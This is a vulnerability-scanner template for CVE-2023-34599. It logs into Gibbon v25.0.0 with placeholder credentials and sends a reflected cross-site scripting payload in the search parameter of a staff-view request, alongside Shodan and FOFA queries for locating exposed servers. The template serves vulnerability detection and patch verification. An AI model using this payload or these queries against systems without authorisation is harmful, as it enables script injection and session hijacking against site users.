id: CVE-2023-34599

info:
  name: Gibbon v25.0.0 - Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: |
    Multiple Cross-Site Scripting (XSS) vulnerabilities have been identified in Gibbon v25.0.0, which enable attackers to execute arbitrary Javascript code.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to inject malicious scripts into web pages viewed by users, leading to potential data theft, session hijacking, or defacement.
  remediation: |
    Apply the latest security patches or updates provided by the vendor to mitigate this vulnerability.
  reference:
    - https://github.com/maddsec/CVE-2023-34599
    - https://vulmon.com/searchpage?q=CVE-2023-34599
    - https://github.com/Imahian/CVE-2023-34599
    - https://github.com/hheeyywweellccoommee/CVE-2023-34599-xsddo
    - https://github.com/nomi-sec/PoC-in-GitHub
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2023-34599
    cwe-id: CWE-79
    epss-score: 0.49308
    epss-percentile: 0.9767
    cpe: cpe:2.3:a:gibbonedu:gibbon:25.0.00:*:*:*:*:*:*:*
  metadata:
    max-request: 2
    vendor: gibbonedu
    product: gibbon
    shodan-query:
      - http.favicon.hash:-165631681
      - http.favicon.hash:"-165631681"
    fofa-query: icon_hash="-165631681"
  tags: cve2023,cve,gibbon,xss,authenticated,intrusive,gibbonedu,vuln

http:
  - raw:
      - |
        POST /login.php? HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary8m88nqhR1NAnQEYZ

        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="address"


        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="method"

        default
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="username"

        {{username}}
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="password"

        {{password}}
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="gibbonSchoolYearID"

        017
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ
        Content-Disposition: form-data; name="gibboni18nID"

        0001
        ------WebKitFormBoundary8m88nqhR1NAnQEYZ--
      - |
        GET /index.php?q=/modules/Staff/staff_view_details.php&gibbonTTID=00000010&gibbonPersonID=0000000001&search=yyraq'><script>alert(document.domain)</script>oq7c8fmwwro&ttDate=05/23/2023&schoolCalendar=N&personalCalendar=N&spaceBookingCalendar=N&fromTT=Y HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body_2
        words:
          - "><script>alert(document.domain)</script>"
          - gibbon
        case-insensitive: true
        condition: and

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
# digest: 4a0a004730450220576ffb5c29e9e8e163490dd0e2d1a61991c61582c38c7200d360deeb3ea261f9022100d05b5afcfab4d07ab6984caedf9ff4b81d966b4a776d2334a6bf88522e457a1d:922c64590222798bb761d5b6d8e72950